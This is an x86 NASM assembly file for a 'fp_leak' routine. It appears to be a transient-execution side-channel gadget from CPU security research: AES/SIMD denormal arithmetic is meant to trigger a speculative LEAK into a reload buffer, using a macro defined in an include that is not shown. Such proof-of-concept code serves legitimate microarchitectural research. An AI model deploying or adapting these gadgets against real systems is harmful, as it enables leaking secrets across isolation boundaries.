%include "common.S"

%define X_VAL   0x0010000000000000
%define Y_VAL   0x4340000000000000

section .data noexec write
    ;Memory for xmm backup
    align 64
    fp_regs:
    %rep 0x1000
    db  0x0
    %endrep

    align 64
    x:
    %rep 8
    dq X_VAL
    %endrep

    align 64
    y:
    %rep 8
    dq Y_VAL
    %endrep

section .text
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fp_leak(uint8_t *reload_buffer, uint8_t *ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fp_leak
align 64
fp_leak:
    ;Backup used xmm registers + Setup
    movdqu  [fp_regs]   , xmm0 
    movdqu  [fp_regs+64], xmm1 


    movsd xmm0, [x]
    movsd xmm1, [y]

;;;;;;; Compute correct value in RCX ;;;;;
xorpd xmm4, xmm4
%rep 1
   xorpd xmm4, xmm4
   aesdeclast xmm4, xmm0
   mulss xmm4, xmm7
%endrep

%rep 10
  nop ; Explicitly suppress any chance of transient execution
%endrep
movq rcx, xmm4        ; Architecturally correct value stored in RCX
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;; AES-SIMD denormal arithmetic ;;;;;;;
xorpd xmm4, xmm4
%rep 1
   xorpd xmm4, xmm4
   aesdeclast xmm4, xmm0
   mulss xmm4, xmm7
%endrep 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    movq    rax, xmm4
    cmp     rax, rcx
    je      fp_leak_arch
; Should not execute architecturally
    LEAK    rdi, rsi
fp_leak_arch:
    ;Restore used xmm registers
    movdqu  xmm0, [fp_regs]
    movdqu  xmm1, [fp_regs+64]
    ret
